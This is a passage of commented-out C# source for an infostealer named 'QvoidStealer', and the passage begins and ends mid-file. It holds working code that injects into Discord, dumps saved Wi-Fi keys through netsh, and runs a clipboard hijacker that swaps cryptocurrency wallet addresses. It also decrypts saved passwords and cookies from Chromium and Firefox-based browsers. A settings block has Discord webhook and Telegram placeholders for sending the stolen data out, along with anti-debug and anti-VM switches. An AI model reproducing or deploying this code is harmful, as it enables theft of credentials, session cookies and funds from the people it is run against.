//                            if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
//                                Environment.Exit(0);

//                            string MainModulePath = protector.Directory;
//                            if (!Directory.Exists(MainModulePath))
//                                continue;

//                            Grabber.Extract(Path, protector.Directory);

//                            Thread.Sleep(100);
//                            if (File.Exists($"{protector.Directory}\\{protector.Name}.exe"))
//                                File.Delete($"{protector.Directory}\\{protector.Name}.exe");

//                            Thread.Sleep(1000);
//                            File.Copy(Assembly.GetEntryAssembly().Location, $"{protector.Directory}\\{protector.Name}.exe");
//                        }
//                        catch (Exception ex)
//                        {
//                            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "Logs.txt", ex.Message);
//                            continue;
//                        }
//                    }

//                }
//            }

//            var DiscordProcs = Process.GetProcessesByName("Discord");
//            foreach (var proc in DiscordProcs)
//                try { proc.Kill(); } catch { }

//            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");
//        }
//    }

//    /// <summary>
//    /// Implementation for "netsh wlan show profile" command.
//    /// </summary>
//    public class WirelessLan
//    {
//        public bool IsAvailable { get; private set; } = true;
//        public List<SSID> SSIDs { get; private set; } = new List<SSID>();

//        public class SSID
//        {
//            public Profile Profile { get; private set; }
//            public Connectivity Connectivity { get; private set; }
//            public Security Security { get; private set; }

//            public SSID(Profile profile, Connectivity connectivity, Security security)
//            {
//                this.Profile = profile;
//                this.Connectivity = connectivity;
//                this.Security = security;
//            }
//        }

//        public class Profile
//        {
//            public string Version { get; private set; }
//            public string Type { get; } = "Wireless Lan";
//            public string Name { get; private set; }
//            public Controls _Controls { get; private set; } = new Controls();

//            public Profile(string profileInformation)
//            {
//                string[] fields = profileInformation.Substring(profileInformation.IndexOf("Profile information \r\n------------------- \r\n    ") + "Profile information \r\n------------------- \r\n    ".Length).Split(new string[] { "\r\n        " }, StringSplitOptions.None);
//                string[] queries = fields[0].Split(new string[] { "\r\n    " }, StringSplitOptions.None);

//                Version = queries[0].Split(':')[1].Substring(1);
//                Name = queries[2].Split(':')[1].Substring(1);

//                _Controls.Connection = fields[1].Split(':')[1].Contains("auto") ? Controls.ConnectionMode.Auto : Controls.ConnectionMode.Manual;
//                _Controls.MacRandomization = !fields[4].Split(':')[1].Contains("disab");
//                _Controls.AutoSwitch = !fields[3].Split(':')[1].Contains("Do not switch");
//                _Controls.Broadcast = fields[2].Split(':')[1].Substring(1);
//            }

//            public class Controls
//            {
//                public enum ConnectionMode
//                {
//                    Auto,
//                    Manual
//                }

//                public ConnectionMode Connection;
//                public string Broadcast { get; internal set; }
//                public bool AutoSwitch { get; internal set; }
//                public bool MacRandomization { get; internal set; }
//            }
//        }

//        public class Connectivity
//        {
//            public int SSIDs { get; private set; }
//            public string Name { get; private set; }
//            public string Type { get; private set; }
//            enum _Type
//            {
//                IBSS,
//                ESS
//            }

//            public Connectivity(string connectivitySettings)
//            {
//                var fields = connectivitySettings.Split(new string[] { "\r\n    " }, StringSplitOptions.None);
//                SSIDs = int.Parse(fields[1].Split(':')[1].Substring(1));
//                Name = fields[2].Split(':')[1].Substring(1).Replace("\"", "");
//                Type = fields[3].Split(':')[1].Substring(1);
//            }
//        }

//        public class Security
//        {
//            public enum Authentication
//            {
//                Open,
//                Shared,
//                WPA,
//                WPAPSK,
//                WPA2,
//                WPA2PSK
//            }

//            public enum Chiper
//            {
//                None = 0x00,
//                WEP40 = 0x01,
//                TKIP = 0x02,
//                CCMP = 0x04,
//                WEP104 = 0x05,
//                WPA_USER_GROUP = 0x100,
//                RSN_USE_GROUP = 0x100,
//                WEP = 0x101,
//            }

//            public Authentication _Authentication { get; private set; }
//            public Chiper _Chiper { get; private set; }
//            public bool SecurityKeyPresent { get; private set; }
//            public string Key { get; private set; }

//            public Security(string securitySettings)
//            {
//                string[] fields = securitySettings.Split(new string[] { "\r\n    " }, StringSplitOptions.None);

//                foreach (var field in fields)
//                    if (field.Contains("Security key"))
//                        SecurityKeyPresent = field.Split(':')[1].Substring(1).Contains("Present");

//                if (SecurityKeyPresent && fields.Length == 7)
//                    Key = fields[6].Split(':')[1].Substring(1);
//                _Chiper = (Chiper)Enum.Parse(typeof(Chiper), fields[2].Split(':')[1].Substring(1));
//                _Authentication = (Authentication)Enum.Parse(typeof(Authentication), fields[1].Split(':')[1].Substring(1).Contains("-") ? fields[1].Split(':')[1].Substring(1).Split('-')[0] : fields[1].Split(':')[1].Substring(1));
//            }
//        }

//        public WirelessLan()
//        {
//            Process proc = new Process()
//            {
//                StartInfo = new ProcessStartInfo
//                {
//                    FileName = "netsh.exe",
//                    Arguments = "wlan show profile",
//                    WindowStyle = ProcessWindowStyle.Hidden,
//                    CreateNoWindow = true,
//                    RedirectStandardOutput = true,
//                    UseShellExecute = false,
//                },
//            };
//            proc.Start();

//            string output = proc.StandardOutput.ReadToEnd();
//            if (!output.Contains("\r\n\r\nUser profiles\r\n-------------\r\n"))
//            {
//                IsAvailable = false;
//                return;
//            }

//            string[] content = output.Split(new string[] { "\r\n\r\nUser profiles\r\n-------------\r\n" }, StringSplitOptions.None)[1].Split(':');

//            proc.Close();
//            proc.Dispose();

//            List<string> SSIDs = new List<string>();
//            Dictionary<string, string> Modules = new Dictionary<string, string>();

//            content.ToList().ForEach(i =>
//            {
//                var ssid = i.Split(new string[] { "All User Profile" }, StringSplitOptions.None);
//                if (ssid.Length > 0 && ssid[0].Contains("\r\n"))
//                    SSIDs.Add(ssid[0].Split(new string[] { "\r\n" }, StringSplitOptions.None)[0].Substring(1));
//            });

//            foreach (var ssid in SSIDs)
//            {
//                proc = new Process()
//                {
//                    StartInfo = new ProcessStartInfo
//                    {
//                        FileName = "netsh.exe",
//                        Arguments = $"wlan show profile {ssid} key=clear",
//                        WindowStyle = ProcessWindowStyle.Hidden,
//                        CreateNoWindow = true,
//                        RedirectStandardOutput = true,
//                        UseShellExecute = false,
//                    },
//                };
//                proc.Start();

//                string result = proc.StandardOutput.ReadToEnd();
//                var options = result.Split(new string[] { "\r\n\r\n" }, StringSplitOptions.None);
//                if (options[0].Contains("There is no such wireless interface on the system"))
//                    continue;

//                this.SSIDs.Add(new SSID(new Profile(options[2]), new Connectivity(options[3]), new Security(options[4])));

//                proc.Close();
//                proc.Dispose();
//            }
//        }
//    }

//    /// <summary>
//    /// Model class
//    /// </summary>
//    sealed class Protector
//    {
//        public string Directory { get; set; }
//        public string Name { get; set; }
//    }

//    /// <summary>
//    /// Simple Crypto clipper.
//    /// </summary>
//    public class CryptoClipper
//    {
//        public struct Patterns
//        {
//            public static Regex BTC = new Regex(@"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", RegexOptions.Compiled);
//            public static Regex ETH = new Regex("/^0x[a-fA-F0-9]{40}$/", RegexOptions.Compiled);
//            public static Regex DOGE = new Regex("D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}", RegexOptions.Compiled);
//            public static Regex LTC = new Regex("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}", RegexOptions.Compiled);
//            public static Regex XMR = new Regex("[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}", RegexOptions.Compiled);
//            public static Regex DASH = new Regex("X[1-9A-HJ-NP-Za-km-z]{33}", RegexOptions.Compiled);
//            public static Regex XRP = new Regex("r[0-9a-zA-Z]{24,34}", RegexOptions.Compiled);
//            public static Regex NEO = new Regex("A[0-9a-zA-Z]{33}", RegexOptions.Compiled);
//        }

//        public bool Enabled;
//        public string BTC_Address { get; internal set; }
//        public string ETH_Address { get; private set; }
//        public string DOGE_Address { get; private set; }
//        public string LTC_Address { get; private set; }
//        public string XMR_Address { get; private set; }
//        public string DASH_Address { get; private set; }
//        public string NEO_Address { get; private set; }
//        public string XRP_Address { get; private set; }

//        public CryptoClipper(string BTC, string ETH, string DOGE, string LTC, string XMR, string DASH, string NEO, string XRP)
//        {
//            if (IsValid(Patterns.BTC, BTC, ""))
//                this.BTC_Address = BTC;
//            else if (IsValid(Patterns.ETH, ETH, ""))
//                this.ETH_Address = ETH;
//            else if (IsValid(Patterns.LTC, LTC, ""))
//                this.LTC_Address = LTC;
//            else if (IsValid(Patterns.XMR, XMR, ""))
//                this.XMR_Address = XMR;
//            else if (IsValid(Patterns.DOGE, DOGE, ""))
//                this.DOGE_Address = DOGE;
//            else if (IsValid(Patterns.DASH, DASH, ""))
//                this.DASH_Address = DASH;
//            else if (IsValid(Patterns.XRP, XRP, ""))
//                this.XRP_Address = XRP;
//            else if (IsValid(Patterns.NEO, NEO, ""))
//                this.NEO_Address = NEO;

//            Enabled = !string.IsNullOrEmpty(this.NEO_Address)
//                   || !string.IsNullOrEmpty(this.BTC_Address)
//                   || !string.IsNullOrEmpty(this.ETH_Address)
//                   || !string.IsNullOrEmpty(this.LTC_Address)
//                   || !string.IsNullOrEmpty(this.XMR_Address)
//                   || !string.IsNullOrEmpty(this.DOGE_Address)
//                   || !string.IsNullOrEmpty(this.DASH_Address)
//                   || !string.IsNullOrEmpty(this.XRP_Address);
//        }

//        public void Start()
//        {
//            Thread t = new Thread(() =>
//            {
//                while (true)
//                {
//                    Thread.Sleep(100);

//                    string text = string.Empty;
//                    try { text = Clipboard.GetText(); }
//                    catch { continue; }

//#pragma warning disable CS0642
//                    if (IsValid(Patterns.BTC, text, BTC_Address)) ;
//                    else if (IsValid(Patterns.ETH, text, ETH_Address)) ;
//                    else if (IsValid(Patterns.LTC, text, LTC_Address)) ;
//                    else if (IsValid(Patterns.XMR, text, XMR_Address)) ;
//                    else if (IsValid(Patterns.DOGE, text, DOGE_Address)) ;
//                    else if (IsValid(Patterns.DASH, text, DASH_Address)) ;
//                    else if (IsValid(Patterns.XRP, text, XRP_Address)) ;
//                    else if (IsValid(Patterns.NEO, text, NEO_Address)) ;
//                    //You can add here more wallets...
//#pragma warning restore CS0642
//                }
//            });
//            t.SetApartmentState(ApartmentState.STA);
//            t.Start();
//            t.Join();

//            while (t.IsAlive)
//                Thread.Sleep(1);
//        }

//        public bool IsValid(Regex regex, string input, string Address)
//        {
//            //Checking if the address that we will replace is not empty (because we don't want to replace his wallet with empty wallt) and if the given text matching the expression.
//            if (!string.IsNullOrEmpty(Address) && regex.Match(input).Success)
//            {
//                Clipboard.SetText(Address);
//                return true;
//            }

//            return false;
//        }
//    }
//}


//namespace QvoidStealer.Main
//{
//    class Settings
//    {
//        public static DiscordWebhook Webhook = new DiscordWebhook("%WEBHOOK_HERE%");
//        public static TelegramAPI Telegram = new TelegramAPI("%TELEGRAM_TOKEN_HERE%", %TELEGRAM_CHAT_ID_HERE%);
//        public static CryptoClipper Clipper = new CryptoClipper("BTC_ADDRESS_HERE_", "ETH_ADDRESS_HERE_", "DODGE_ADDRESS_HERE_", "LTC_ADDRESS_HERE_", "XMR_ADDRESS_HERE_", "DASH_ADDRESS_HERE_", "NEO_ADDRESS_HERE_", "XRP_ADDRESS_HERE_");

//        public static bool AntiWebSinffers = true;
//        public static bool AntiDebug = true;
//        public static bool AntiVM = false;
//        public static bool AntiSandBoxie = false;
//        public static bool AntiEmulation = true;
//    }
//}


//namespace QvoidStealer.Miscellaneous.Stealers.Browsers
//{
//    public class ChromiumGrabber
//    {
//        public string CookiePath;
//        public string KeyPath;
//        public string PasswordPath;
//        public string BrowserName;

//        public ChromiumGrabber(string CookiePath, string KeyPath, string PasswordPath, string BrowserName)
//        {
//            this.CookiePath = CookiePath;
//            this.KeyPath = KeyPath;
//            this.PasswordPath = PasswordPath;
//            this.BrowserName = BrowserName;
//        }

//        internal sealed class ChromiumDecryptor
//        {
//            public static byte[] GetKey(string KeyPath)
//            {
//                var v = File.ReadAllText(KeyPath);

//                dynamic json = JsonConvert.DeserializeObject(v);
//                string key = json.os_crypt.encrypted_key;

//                var src = Convert.FromBase64String(key);
//                var encryptedKey = src.Skip(5).ToArray();

//                var decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);

//                return decryptedKey;
//            }

//            public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
//            {
//                var sR = string.Empty;
//                try
//                {
//                    var cipher = new GcmBlockCipher(new AesEngine());
//                    var parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

//                    cipher.Init(false, parameters);
//                    var plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
//                    var retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
//                    cipher.DoFinal(plainBytes, retLen);

//                    sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
//                }
//                catch (Exception ex)
//                {
//                    Console.WriteLine(ex.Message);
//                    Console.WriteLine(ex.StackTrace);
//                }

//                return sR;
//            }

//            public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
//            {
//                nonce = new byte[12];
//                ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

//                Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
//                Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
//            }
//        }

//        public List<CredentialModel> ReadPasswords()
//        {
//            var result = new List<CredentialModel>();

//            var p = Path.GetFullPath(PasswordPath);

//            if (File.Exists(KeyPath) && File.Exists(p))
//            {
//                using (var conn = new SQLiteConnection($"Data Source={p};"))
//                {
//                    conn.Open();
//                    using (var cmd = conn.CreateCommand())
//                    {
//                        cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
//                        using (var reader = cmd.ExecuteReader())
//                        {

//                            if (reader.HasRows)
//                            {
//                                var key = ChromiumDecryptor.GetKey(KeyPath);
//                                while (reader.Read())
//                                {
//                                    byte[] nonce, ciphertextTag;
//                                    var encryptedData = GetBytes(reader, 2);
//                                    ChromiumDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
//                                    var pass = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce);

//                                    result.Add(new CredentialModel()
//                                    {
//                                        Url = reader.GetString(0),
//                                        Username = reader.GetString(1),
//                                        Password = pass
//                                    });
//                                }
//                            }
//                        }
//                    }
//                    conn.Close();
//                }

//            }
//            else
//            {
//                return null;
//                throw new FileNotFoundException($"Cannot find {BrowserName}'s file");
//            }
//            return result;
//        }

//        private static byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
//        {
//            const int CHUNK_SIZE = 2 * 1024;
//            byte[] buffer = new byte[CHUNK_SIZE];
//            long bytesRead;
//            long fieldOffset = 0;
//            using (MemoryStream stream = new MemoryStream())
//            {
//                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
//                {
//                    stream.Write(buffer, 0, (int)bytesRead);
//                    fieldOffset += bytesRead;
//                }
//                return stream.ToArray();
//            }
//        }

//        public List<CookieModel> GetCookies()
//        {
//            if (!File.Exists(KeyPath))
//            {
//                return null;
//                throw new FileNotFoundException($"Cannot find {BrowserName}'s file");
//            }

//            return GetAllCookies(ChromiumDecryptor.GetKey(KeyPath));
//        }

//        private List<CookieModel> GetAllCookies(byte[] key)
//        {
//            try
//            {
//                List<CookieModel> cookies = new List<CookieModel>();
//                if (!Directory.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

//                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={CookiePath};pooling=false"))
//                using (var cmd = conn.CreateCommand())
//                {
//                    cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";

//                    conn.Open();
//                    using (var reader = cmd.ExecuteReader())
//                    {
//                        while (reader.Read())
//                        {
//                            ChromiumDecryptor.Prepare((byte[])reader[1], out byte[] nonce, out byte[] ciphertextTag);
//                            cookies.Add(new CookieModel()
//                            {
//                                Name = reader.GetString(0),

//                                Value = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce),
//                                HostName = reader.GetString(2)
//                            });
//                        }
//                    }
//                    conn.Close();
//                }
//                return cookies;
//            }
//            catch { return null; }
//        }
//    }
//}


//namespace QvoidStealer.Miscellaneous.Stealers.Browsers
//{
//    class GeckoGrabber
//    {
//        internal sealed class Common
//        {

//            internal struct Cookie
//            {
//                public string sHostKey { get; set; }
//                public string sName { get; set; }
//                public string sPath { get; set; }
//                public string sExpiresUtc { get; set; }
//                public string sKey { get; set; }
//                public string sValue { get; set; }
//                public string sIsSecure { get; set; }
//            }

//            internal struct Site
//            {
//                public string sUrl { get; set; }
//                public string sTitle { get; set; }
//                public int iCount { get; set; }
//            }

//            internal struct Bookmark
//            {
//                public string sUrl { get; set; }
//                public string sTitle { get; set; }
//            }
//        }

//        internal sealed class WinApi
//        {
//            [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
//            internal static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

//            [DllImport("kernel32.dll", SetLastError = true)]
//            [return: MarshalAs(UnmanagedType.Bool)]
//            internal static extern bool FreeLibrary(IntPtr hModule);

//            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
//            internal static extern IntPtr GetProcAddress(IntPtr hModule, string sProcName);
//        }

//        internal sealed class Nss3
//        {
//            public struct TSECItem
//            {
//                public int SECItemType;
//                public IntPtr SECItemData;
//                public int SECItemLen;
//            }

//            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
//            public delegate long NssInit(string sDirectory);

//            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
//            public delegate long NssShutdown();

//            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
//            public delegate int Pk11SdrDecrypt(ref TSECItem tsData, ref TSECItem tsResult, int iContent);
//        }

//        public static class Decryptor
//        {
//            private static IntPtr hNss3;
//            private static IntPtr hMozGlue;

//            private static Nss3.NssInit fpNssInit;
//            private static Nss3.Pk11SdrDecrypt fpPk11SdrDecrypt;
//            private static Nss3.NssShutdown fpNssShutdown;

//            public static bool LoadNSS(string sPath)
//            {
//                try
//                {
//                    hMozGlue = WinApi.LoadLibrary(sPath + "\\mozglue.dll");
//                    hNss3 = WinApi.LoadLibrary(sPath + "\\nss3.dll");

//                    IntPtr ipNssInitAddr = WinApi.GetProcAddress(hNss3, "NSS_Init");
//                    IntPtr ipNssPk11SdrDecrypt = WinApi.GetProcAddress(hNss3, "PK11SDR_Decrypt");
//                    IntPtr ipNssShutdown = WinApi.GetProcAddress(hNss3, "NSS_Shutdown");

//                    fpNssInit = (Nss3.NssInit)Marshal.GetDelegateForFunctionPointer(ipNssInitAddr, typeof(Nss3.NssInit));
//                    fpPk11SdrDecrypt = (Nss3.Pk11SdrDecrypt)Marshal.GetDelegateForFunctionPointer(ipNssPk11SdrDecrypt, typeof(Nss3.Pk11SdrDecrypt));
//                    fpNssShutdown = (Nss3.NssShutdown)Marshal.GetDelegateForFunctionPointer(ipNssShutdown, typeof(Nss3.NssShutdown));

//                    return true;
//                }
//                catch (Exception ex) { Console.WriteLine("Failed to load NSS\n" + ex); return false; }

//            }

//            public static void UnLoadNSS()
//            {
//                fpNssShutdown();
//                WinApi.FreeLibrary(hNss3);
//                WinApi.FreeLibrary(hMozGlue);
//            }

//            public static bool SetProfile(string sProfile)
//            {
//                return (fpNssInit(sProfile) == 0);
//            }

//            public static string DecryptPassword(string sEncPass)
//            {
//                IntPtr lpMemory = IntPtr.Zero;

//                try
//                {
//                    byte[] bPassDecoded = Convert.FromBase64String(sEncPass);

//                    lpMemory = Marshal.AllocHGlobal(bPassDecoded.Length);
//                    Marshal.Copy(bPassDecoded, 0, lpMemory, bPassDecoded.Length);

//                    Nss3.TSECItem tsiOut = new Nss3.TSECItem();
//                    Nss3.TSECItem tsiItem = new Nss3.TSECItem();

//                    tsiItem.SECItemType = 0;
//                    tsiItem.SECItemData = lpMemory;
//                    tsiItem.SECItemLen = bPassDecoded.Length;

//                    if (fpPk11SdrDecrypt(ref tsiItem, ref tsiOut, 0) == 0)
//                    {
//                        if (tsiOut.SECItemLen != 0)
//                        {
//                            byte[] bDecrypted = new byte[tsiOut.SECItemLen];
//                            Marshal.Copy(tsiOut.SECItemData, bDecrypted, 0, tsiOut.SECItemLen);

//                            return Encoding.UTF8.GetString(bDecrypted);
//                        }
//                    }
//                }
//                catch (Exception ex)
//                {
//                    Console.WriteLine(ex);
//                    return null;
//                }
//                finally
//                {
//                    if (lpMemory != IntPtr.Zero)
//                        Marshal.FreeHGlobal(lpMemory);
//                }

//                return null;
//            }

//            public static string GetUTF8(string sNonUtf8)
//            {
//                try
//                {
//                    byte[] bData = Encoding.Default.GetBytes(sNonUtf8);
//                    return Encoding.UTF8.GetString(bData);
//                }
//                catch { return sNonUtf8; }
//            }
//        }

//        public class Profile
//        {
//            public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
//            private static string[] GeckoBrowsersList = new string[]
//            {
//                "Mozilla\\Firefox",
//                "Waterfox",
//                "K-Meleon",
//                "Thunderbird",
//                "Comodo\\IceDragon",
//                "8pecxstudios\\Cyberfox",
//                "NETGATE Technologies\\BlackHaw",
//                "Moonchild Productions\\Pale Moon"
//            };

//            private static string[] Concat(string[] x, string[] y)
//            {
//                if (x == null) throw new ArgumentNullException("x");
//                if (y == null) throw new ArgumentNullException("y");
//                int oldLen = x.Length;
//                Array.Resize(ref x, x.Length + y.Length);
//                Array.Copy(y, 0, x, oldLen, y.Length);
//                return x;
//            }

//            // Get program files path
//            private static string[] ProgramFilesChildren()
//            {
//                string programFiles = Environment.ExpandEnvironmentVariables("%ProgramW6432%");
//                string programFilesX86 = Environment.ExpandEnvironmentVariables("%ProgramFiles(x86)%");

//                List<string> directories = new List<string>();
//                try { directories.AddRange(Directory.GetDirectories(programFiles)); } catch { }
//                try { directories.AddRange(Directory.GetDirectories(programFilesX86)); } catch { }

//                return directories.ToArray();
//            }

//            // Get profile directory location
//            public static string GetProfile(string path)
//            {
//                try
//                {
//                    string dir = Path.Combine(path, "Profiles");
//                    if (Directory.Exists(dir))
//                        foreach (string sDir in Directory.GetDirectories(dir))
//                            if (File.Exists(sDir + "\\logins.json") ||
//                                File.Exists(sDir + "\\key4.db") ||
//                                File.Exists(sDir + "\\places.sqlite"))
//                                return sDir;
//                }
//                catch (Exception ex) { Console.WriteLine("Failed to find profile\n" + ex); }
//                return null;
//            }

//            // Get directory with nss3.dll
//            public static string GetMozillaPath()
//            {
//                foreach (string sDir in ProgramFilesChildren())
//                {
//                    if (File.Exists(sDir + "\\nss3.dll") &&
//                        File.Exists(sDir + "\\mozglue.dll"))
//                        return sDir;
//                }
//                return null;
//            }

//            // Get gecko based browsers path
//            public static string[] GetMozillaBrowsers()
//            {
//                List<string> foundBrowsers = new List<string>();
//                foreach (string browser in GeckoBrowsersList)
//                {
//                    string bdir = Path.Combine(Appdata, browser);
//                    if (Directory.Exists(bdir))
//                    {
//                        foundBrowsers.Add(bdir);
//                    }
//                }
//                return foundBrowsers.ToArray();
//            }
//        }

//        internal class SQLite
//        {
//            private readonly byte[] _sqlDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
//            private readonly ulong _dbEncoding;
//            private readonly byte[] _fileBytes;
//            private readonly ulong _pageSize;
//            private string[] _fieldNames;
//            private SqliteMasterEntry[] _masterTableEntries;
//            private TableEntry[] _tableEntries;

//            public SQLite(string fileName)
//            {
//                _fileBytes = File.ReadAllBytes(fileName);
//                _pageSize = ConvertToULong(16, 2);
//                _dbEncoding = ConvertToULong(56, 4);
//                ReadMasterTable(100L);
//            }

//            public string GetValue(int rowNum, int field)
//            {
//                try
//                {
//                    if (rowNum >= _tableEntries.Length)
//                        return (string)null;
//                    return field >= _tableEntries[rowNum].Content.Length ? null : _tableEntries[rowNum].Content[field];
//                }
//                catch
//                {
//                    return "";
//                }
//            }

//            public int GetRowCount()
//            {
//                return _tableEntries.Length;
//            }

//            private bool ReadTableFromOffset(ulong offset)
//            {
//                try
//                {
//                    if (_fileBytes[offset] == 13)
//                    {
//                        uint num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
//                        int num2 = 0;
//                        if (_tableEntries != null)
//                        {
//                            num2 = _tableEntries.Length;
//                            Array.Resize(ref _tableEntries, _tableEntries.Length + (int)num1 + 1);
//                        }
//                        else
//                            _tableEntries = new TableEntry[(int)num1 + 1];
//                        for (uint index1 = 0; (int)index1 <= (int)num1; ++index1)
//                        {
//                            ulong num3 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
//                            if ((long)offset != 100L)
//                                num3 += offset;
//                            int endIdx1 = Gvl((int)num3);
//                            Cvl((int)num3, endIdx1);
//                            int endIdx2 = Gvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L));
//                            Cvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L), endIdx2);
//                            ulong num4 = num3 + (ulong)(endIdx2 - (long)num3 + 1L);
//                            int endIdx3 = Gvl((int)num4);
//                            int endIdx4 = endIdx3;
//                            long num5 = Cvl((int)num4, endIdx3);
//                            RecordHeaderField[] array = null;
//                            long num6 = (long)num4 - endIdx3 + 1L;
//                            int index2 = 0;
//                            while (num6 < num5)
//                            {
//                                Array.Resize(ref array, index2 + 1);
//                                int startIdx = endIdx4 + 1;
//                                endIdx4 = Gvl(startIdx);
//                                array[index2].Type = Cvl(startIdx, endIdx4);
//                                array[index2].Size = array[index2].Type <= 9L ? _sqlDataTypeSize[array[index2].Type] : (!IsOdd(array[index2].Type) ? (array[index2].Type - 12L) / 2L : (array[index2].Type - 13L) / 2L);
//                                num6 = num6 + (endIdx4 - startIdx) + 1L;
//                                ++index2;
//                            }
//                            if (array != null)
//                            {
//                                _tableEntries[num2 + (int)index1].Content = new string[array.Length];
//                                int num7 = 0;
//                                for (int index3 = 0; index3 <= array.Length - 1; ++index3)
//                                {
//                                    if (array[index3].Type > 9L)
//                                    {
//                                        if (!IsOdd(array[index3].Type))
//                                        {
//                                            if ((long)_dbEncoding == 1L)
//                                                _tableEntries[num2 + (int)index1].Content[index3] = Encoding.Default.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
//                                            else if ((long)_dbEncoding == 2L)
//                                            {
//                                                _tableEntries[num2 + (int)index1].Content[index3] = Encoding.Unicode.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
//                                            }
//                                            else if ((long)_dbEncoding == 3L)
//                                                _tableEntries[num2 + (int)index1].Content[index3] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
//                                        }
//                                        else
//                                            _tableEntries[num2 + (int)index1].Content[index3] = Encoding.Default.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
//                                    }
//                                    else
//                                        _tableEntries[num2 + (int)index1].Content[index3] = Convert.ToString(ConvertToULong((int)((long)num4 + num5 + num7), (int)array[index3].Size));
//                                    num7 += (int)array[index3].Size;
//                                }
//                            }
//                        }
//                    }
//                    else if (_fileBytes[offset] == 5)
//                    {
//                        uint num1 = (uint)(ConvertToULong((int)((long)offset + 3L), 2) - 1UL);
//                        for (uint index = 0; (int)index <= (int)num1; ++index)
//                        {
//                            uint num2 = (uint)ConvertToULong((int)offset + 12 + (int)index * 2, 2);
//                            ReadTableFromOffset((ConvertToULong((int)((long)offset + num2), 4) - 1UL) * _pageSize);
//                        }
//                        ReadTableFromOffset((ConvertToULong((int)((long)offset + 8L), 4) - 1UL) * _pageSize);
//                    }
//                    return true;
//                }
//                catch
//                {
//                    return false;
//                }
//            }

//            private void ReadMasterTable(long offset)
//            {
//                try
//                {
//                    switch (_fileBytes[offset])
//                    {
//                        case 5:
//                            uint num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
//                            for (int index = 0; index <= (int)num1; ++index)
//                            {
//                                uint num2 = (uint)ConvertToULong((int)offset + 12 + index * 2, 2);
//                                if (offset == 100L)
//                                    ReadMasterTable(((long)ConvertToULong((int)num2, 4) - 1L) * (long)_pageSize);
//                                else
//                                    ReadMasterTable(((long)ConvertToULong((int)(offset + num2), 4) - 1L) * (long)_pageSize);
//                            }
//                            ReadMasterTable(((long)ConvertToULong((int)offset + 8, 4) - 1L) * (long)_pageSize);
//                            break;
//                        case 13:
//                            ulong num3 = ConvertToULong((int)offset + 3, 2) - 1UL;
//                            int num4 = 0;
//                            if (_masterTableEntries != null)
//                            {
//                                num4 = _masterTableEntries.Length;
//                                Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num3 + 1);
//                            }
//                            else
//                                _masterTableEntries = new SqliteMasterEntry[checked((ulong)unchecked((long)num3 + 1L))];
//                            for (ulong index1 = 0; index1 <= num3; ++index1)
//                            {
//                                ulong num2 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
//                                if (offset != 100L)
//                                    num2 += (ulong)offset;
//                                int endIdx1 = Gvl((int)num2);
//                                Cvl((int)num2, endIdx1);
//                                int endIdx2 = Gvl((int)((long)num2 + (endIdx1 - (long)num2) + 1L));
//                                Cvl((int)((long)num2 + (endIdx1 - (long)num2) + 1L), endIdx2);
//                                ulong num5 = num2 + (ulong)(endIdx2 - (long)num2 + 1L);
//                                int endIdx3 = Gvl((int)num5);
//                                int endIdx4 = endIdx3;
//                                long num6 = Cvl((int)num5, endIdx3);
//                                long[] numArray = new long[5];
//                                for (int index2 = 0; index2 <= 4; ++index2)
//                                {
//                                    int startIdx = endIdx4 + 1;
//                                    endIdx4 = Gvl(startIdx);
//                                    numArray[index2] = Cvl(startIdx, endIdx4);
